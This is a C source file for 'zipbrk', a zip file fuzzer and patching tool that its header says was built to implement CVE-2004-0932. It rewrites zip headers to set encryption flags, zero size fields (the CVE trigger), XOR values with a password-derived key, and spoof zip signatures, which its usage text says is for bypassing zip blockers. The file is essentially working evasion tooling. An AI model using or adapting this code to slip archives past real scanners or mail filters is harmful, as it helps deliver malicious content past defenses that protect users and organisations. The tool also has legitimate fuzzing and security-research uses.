/*
 * Zip Break (zipbrk)
 * zip file format fuzzer and multi-tool
 *
 * Originally designed to implement CVE-2004-0932, et al.
 * and later expanded to modify a range of values for various
 * purposes. Updated to support 64-bit platforms and tested
 * on an array of modern operating systems and architectures
 * to include:
 *    armhf
 *    arm7l
 *    ia64/amd64
 *    x86
 *    Debian 8/9
 *    Windows 2000/XP
 *    Windows Vista/7/8
 *    Windows 10
 *    Nethunter
 *    Kali 2017.x
 *    FreeBSD 11
 *    NetBSD
 *    Fedora 23/24
 *    Raspbian
 *    iOS 10/11
 *    Android OnePlus X Onyx
 *
 * You are free to use, modify, and distribute this program as
 * you see fit for personal, commercial, or government needs.
 *
 * No point-of-contact for support is provided or implied. This
 * code is provided as-is.
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define ZIPBRK_VERSION    "2.1.1a"

#pragma pack(push, 1)
typedef struct s_local_hdr
{
    uint32_t sig; // 0x04034B50
    uint16_t x_ver;
    uint16_t flag;
    uint16_t comp;
    uint16_t m_time;
    uint16_t m_date;
    uint32_t crc32;
    uint32_t c_size;
    uint32_t u_size;
    uint16_t namelen;
    uint16_t fieldlen;
} LOCALHDR, *PLOCALHDR, *LPLOCALHDR;

typedef struct s_data_desc
{
    uint32_t crc32;
    uint32_t c_size;
    uint32_t u_size;
} DATADESC, *PDATADESC, *LPDATADESC;

typedef struct s_central_hdr
{
    uint32_t sig; // 0x02014B50
    uint16_t m_ver;
    uint16_t x_ver;
    uint16_t flag;
    uint16_t comp;
    uint16_t m_time;
    uint16_t m_date;
    uint32_t crc32;
    uint32_t c_size;
    uint32_t u_size;
    uint16_t namelen;
    uint16_t fieldlen;
    uint16_t disk;
    uint16_t i_attr;
    uint32_t x_attr;
    uint32_t roh;
} CENTRALHDR, *PCENTRALHDR, *LPCENTRALHDR;

typedef struct s_central_end
{
    uint32_t sig; // 0x06054B50
    uint16_t disk;
    uint16_t s_disk;
    uint16_t l_count;
    uint16_t g_count;
    uint32_t c_size;
    uint32_t offset;
    uint16_t commentlen;
} CENTRALEND, *PCENTRALEND, *LPCENTRALEND;
#pragma pack(pop)

/* PKZIP magic numbers */
#define PK_LOCALHDR      0x04034B50
#define PK_CENTRALHDR    0x02014B50
#define PK_CENTRALEND    0x06054B50

/* ZIPBRK magic numbers */
#define ZB_LOCALHDR      0x0403534D
#define ZB_CENTRALHDR    0x0201534D
#define ZB_CENTRALEND    0x0605534D

/* defines for zip flags */
#define ZIP_ENCRYPT     0x1
#define ZIP_BIT1        0x2
#define ZIP_BIT2        0x4
#define ZIP_DATADESC    0x8

/* defines for options FLAGS */
#define EFLAG     0x0001
#define CFLAG     0x0002
#define UFLAG     0x0004
#define XEFLAG    0x0008
#define XSFLAG    0x0010
#define SFLAG     0x0020
#define XCFLAG    0x0040
#define XUFLAG    0x0080
#define ZDFLAG    0x0100
#define ZTFLAG    0x0200
#define DEFLAG    0x0400
#define DSFLAG    0x0800

/* configuration options */
#define MAXPASSLEN    128

uint16_t FLAGS;
uint32_t PWHASH;

/* show program help message */
void show_usage()
{
    printf(
    	"zipbrk-%s zip file format fuzzer\n"
        "Usage: zipbrk <zip_file> <option>\n"
        "Options:\n"
        "    -e      Set data encryption flag. (default)\n"
        "              --encryption-set\n"
        "    -de     Unset data encryption flag.\n"
        "              --encryption-unset\n"
        "    -c      Set compressed size to 0. (non-reversible)\n"
        "              --zero-compressed\n"
        "    -u      Set uncompressed size to 0. (non-reversible) (CVE-2004-0932)\n"
        "              --zero-uncompressed\n"
        "    -d      Set date to 0. (non-reversible)\n"
        "              --zero-date\n"
        "    -t      Set time to 0. (non-reversible)\n"
        "              --zero-time\n"
        "    -xe     XOR extract version. (password prompted)\n"
        "              --xor-extract\n"
        "    -xs     XOR CRC32. (password prompted) (halts extraction)\n"
        "              --xor-crc32\n"
        "    -xc     XOR compressed size. (password prompted)\n"
        "              --xor-compressed\n"
        "    -xu     XOR uncompressed size. (password prompted)\n"
        "              --xor-uncompressed\n"
        "    -s      Alter zip file signatures. (detectable) (bypass zip blockers)\n"
        "              --signature-spoof\n"
        "    -ds     Reset zip file signatures.\n"
        "              --signature-restore\n"
        "\n"
        "  Example:\n"
        "    zipbrk README.zip -e -u -s -xs\n"
        "    zipbrk README.zip --encryption-unset --xor-crc32\n"
        , ZIPBRK_VERSION
    );
}

uint32_t pass_hash(unsigned char *pass, uint16_t len)
{
    uint32_t hash = 0;
    uint16_t n;

    for ( n = 0; n < len; n++ )
        hash += pass[n];
    return hash;
}    

/* patch write: write data a single byte at a time to a file opened as rb+ */
size_t patch_write(const void *buffer, size_t size, size_t count, FILE *stream)
{
    const unsigned char *p;
    size_t c, s, len;

    p = buffer;
    for (c = 0, len = 0; c < count; c++) {
        for (s = 0; s < size; s++) {
            if ( (len += fwrite(&p[s], sizeof(unsigned char), 1, stream)) < sizeof(unsigned char) )
                return len;
        }
    }
    return len;
}

/* apply modifications to a zip file */
void patch_zip(const char *filename)
{
    FILE *hfile;
    uint32_t buffer;
    long offset;

    if ( (hfile = fopen(filename, "rb+") ) == NULL) {
        printf("[!] Error: Unable to open %s\n", filename); return; }

    printf("  [+] Processing options...\n");
    fseek(hfile, 0, SEEK_SET);
    while ( fread(&buffer, sizeof(buffer), 1, hfile) )
    {
        /* local file header */
        if ( (buffer == PK_LOCALHDR) || (buffer == ZB_LOCALHDR) )
        {
            LOCALHDR lh;
            fseek(hfile, -sizeof(buffer), SEEK_CUR);
            fread(&lh, sizeof(LOCALHDR), 1, hfile);
            offset = ftell(hfile);
            fseek(hfile, -sizeof(lh), SEEK_CUR);

            printf("  [-] Writing local header patch [0x%.8X]\n", ftell(hfile));
            if (FLAGS & EFLAG) {
                if (!(lh.flag & ZIP_ENCRYPT)) lh.flag |= 0x1; }
            if (FLAGS & DEFLAG) {
                if (lh.flag & ZIP_ENCRYPT) lh.flag = lh.flag ^ 0x1; }
            if (FLAGS & CFLAG)
                lh.c_size = 0;
            if (FLAGS & UFLAG)
                lh.u_size = 0;
            if (FLAGS & ZDFLAG)
                lh.m_date = 0;
            if (FLAGS & ZTFLAG)
                lh.m_time = 0;
            if (FLAGS & XEFLAG)
                lh.x_ver = (lh.x_ver ^ PWHASH);
            if (FLAGS & XSFLAG)
                lh.crc32 = (lh.crc32 ^ PWHASH);
            if (FLAGS & XCFLAG)
                lh.c_size = (lh.c_size ^ PWHASH);
            if (FLAGS & XUFLAG)
                lh.u_size = (lh.u_size ^ PWHASH);
            if (FLAGS & SFLAG)
                lh.sig = ZB_LOCALHDR;
            if (FLAGS & DSFLAG)
                lh.sig = PK_LOCALHDR;

            patch_write(&lh, sizeof(lh), 1, hfile);
            fseek(hfile, offset, SEEK_SET);
        }

        /* central file header */
        if ( (buffer == PK_CENTRALHDR) || (buffer == ZB_CENTRALHDR) )
        {
            CENTRALHDR ch;
            fseek(hfile, -sizeof(buffer), SEEK_CUR);
            fread(&ch, sizeof(CENTRALHDR), 1, hfile);
            offset = ftell(hfile);
            fseek(hfile, -sizeof(ch), SEEK_CUR);

            printf("  [-] Writing central header patch [0x%.8X]\n", ftell(hfile));
            if (FLAGS & EFLAG) {
                if (!(ch.flag & ZIP_ENCRYPT)) ch.flag |= 0x1; }
            if (FLAGS & DEFLAG) {
                if (ch.flag & ZIP_ENCRYPT) ch.flag = ch.flag ^ 0x1; }
            if (FLAGS & CFLAG)
                ch.c_size = 0;
            if (FLAGS & UFLAG)
                ch.u_size = 0;
            if (FLAGS & ZDFLAG)
                ch.m_date = 0;
            if (FLAGS & ZTFLAG)
                ch.m_time = 0;
            if (FLAGS & XEFLAG)
                ch.x_ver = (ch.x_ver ^ PWHASH);
            if (FLAGS & XSFLAG)
                ch.crc32 = (ch.crc32 ^ PWHASH);
            if (FLAGS & XCFLAG)
                ch.c_size = (ch.c_size ^ PWHASH);
            if (FLAGS & XUFLAG)
                ch.u_size = (ch.u_size ^ PWHASH);
            if (FLAGS & SFLAG)
                ch.sig = ZB_CENTRALHDR;
            if (FLAGS & DSFLAG)
                ch.sig = PK_CENTRALHDR;

            patch_write(&ch, sizeof(ch), 1, hfile);
            fseek(hfile, offset, SEEK_SET);
        }

        /* central directory header */
        if ( (buffer == PK_CENTRALEND) || (buffer == ZB_CENTRALEND) )
        {
            CENTRALEND ce;
            fseek(hfile, -sizeof(buffer), SEEK_CUR);
            fread(&ce, sizeof(CENTRALEND), 1, hfile);
            offset = ftell(hfile);
            fseek(hfile, -sizeof(ce), SEEK_CUR);

            printf("  [-] Writing central directory patch [0x%.8X]\n", ftell(hfile));
            if (FLAGS & SFLAG)
                ce.sig = ZB_CENTRALEND;
            if (FLAGS & DSFLAG)
                ce.sig = PK_CENTRALEND;
            
            patch_write(&ce, sizeof(ce), 1, hfile);
            fseek(hfile, offset, SEEK_SET);
        }
        fseek(hfile, -(sizeof(buffer) - 1), SEEK_CUR);
    }
    fclose(hfile);
}

/* prompt user for password and generate hash */
void prompt_pass()
{
    char passwd[MAXPASSLEN], verify[MAXPASSLEN];
    int n;
    
    /* initialisation */
    memset(passwd, 0, sizeof(passwd));
    memset(verify, 0, sizeof(verify));
    
    /* prompt password */
    printf("Enter Password: ");
    fgets(passwd, sizeof(passwd)-1, stdin);
    for ( n = 0; n < sizeof(passwd); n++ ) {
        if ( (passwd[n] == 0x0D) || (passwd[n] == 0x0A) ) { passwd[n] = 0x00; break; }}
    
    /* prompt verify password */
    printf("Verify Password: ");
    fgets(verify, sizeof(verify)-1, stdin);
    for ( n = 0; n < sizeof(verify); n++ ) {
        if ( (verify[n] == 0x0D) || (verify[n] == 0x0A) ) { verify[n] = 0x00; break; }}
    
    /* verify password match */
    for ( n = 0; n < MAXPASSLEN; n++ ) {
        if (!(passwd[n] == verify[n])) { printf("Password Mismatch.\n"); exit(1); }}
    for ( n = 0; n < sizeof(passwd); n++ ) {
        if (!(passwd[n] == verify[n])) { printf("Password Mismatch.\n"); exit(1); }}
    for ( n = 0; n < sizeof(verify); n++ ) {
        if (!(passwd[n] == verify[n])) { printf("Password Mismatch.\n"); exit(1); }}
    
    /* generate hash and cleanup */
    PWHASH = pass_hash(passwd, strlen(passwd));
}

/* main entry point */
int main(int argc, char **argv)
{
    uint8_t k;
    unsigned char *filename;
    uint8_t pwprompt = 0;

    if ( argc < 2 ) {
        show_usage(); return 0; }
    if ( !strcmp(argv[1], "-h") || !strcmp(argv[1], "/?") || !strcmp(argv[1], "--help") ) {
        show_usage(); return 0; }

    filename = argv[1];
    FLAGS = 0;

    printf("[+] Setting program options.\n");
    if ( argc == 2 )
    {
        FLAGS |= EFLAG;
        printf("  [-] Option Set: Encryption Flag\t[ ON]\n");
    }
    for ( k = 2; k < argc; k++ )
    {
        if (!strcmp(argv[k], "-e") || !strcmp(argv[k], "--encryption-set")) {
            FLAGS |= EFLAG; printf("  [-] Option Set: Encryption Flag\t[ ON]\n"); }
        
        else if (!strcmp(argv[k], "-de") || !strcmp(argv[k], "--encryption-unset")) {
            FLAGS |= DEFLAG; printf("  [-] Option Set: Encryption Flag\t[OFF]\n"); }
        
        else if (!strcmp(argv[k], "-c") || !strcmp(argv[k], "--zero-compressed")) {
            FLAGS |= CFLAG; printf("  [-] Option Set: Compressed 0\t[ ON]\n"); }
            
        else if (!strcmp(argv[k], "-u") || !strcmp(argv[k], "--zero-uncompressed")) {
            FLAGS |= UFLAG; printf("  [-] Option Set: Uncompressed 0\t[ ON]\n"); }
        
        else if (!strcmp(argv[k], "-d") || !strcmp(argv[k], "--zero-date")) {
            FLAGS |= ZDFLAG; printf("  [-] Option Set: Zero Date\t\t[ ON]\n"); }
            
        else if (!strcmp(argv[k], "-t") || !strcmp(argv[k], "--zero-time")) {
            FLAGS |= ZTFLAG; printf("  [-] Option Set: Zero Time\t\t[ ON]\n"); }
            
        else if (!strcmp(argv[k], "-xe") || !strcmp(argv[k], "--xor-extract")) {
            FLAGS |= XEFLAG; printf("  [-] Option Set: XOR Extract\t\t[ ON]\n"); pwprompt = 1; }
            
        else if (!strcmp(argv[k], "-xs") || !strcmp(argv[k], "--xor-crc32")) {
            FLAGS |= XSFLAG; printf("  [-] Option Set: XOR CRC32\t\t[ ON]\n"); pwprompt = 1; }
            
        else if (!strcmp(argv[k], "-xc") || !strcmp(argv[k], "--xor-compressed")) {
            FLAGS |= XCFLAG; printf("  [-] Option Set: XOR Compressed\t[ ON]\n"); pwprompt = 1; }
            
        else if (!strcmp(argv[k], "-xu") || !strcmp(argv[k], "--xor-uncompressed")) {
            FLAGS |= XUFLAG; printf("  [-] Option Set: XOR Uncompressed\t[ ON]\n"); pwprompt = 1; }
        
        else if (!strcmp(argv[k], "-s") || !strcmp(argv[k], "--signature-spoof")) {
            FLAGS |= SFLAG; printf("  [-] Option Set: Alter Signature\t[ ON]\n"); }
            
        else if (!strcmp(argv[k], "-ds") || !strcmp(argv[k], "--signature-restore")) {
            FLAGS |= DSFLAG; printf("  [-] Option Set: Alter Signature\t[OFF]\n"); }
        

        else {
            printf("  [!] Option Set: Unknown Option\t[%s]\n", argv[k]); }
    }
    
    if ( pwprompt )
        prompt_pass();

    printf("[+] Modifying %s ...\n", filename);
    patch_zip(filename);
    printf("[+] Modifications complete.\n");

    return 0;
}
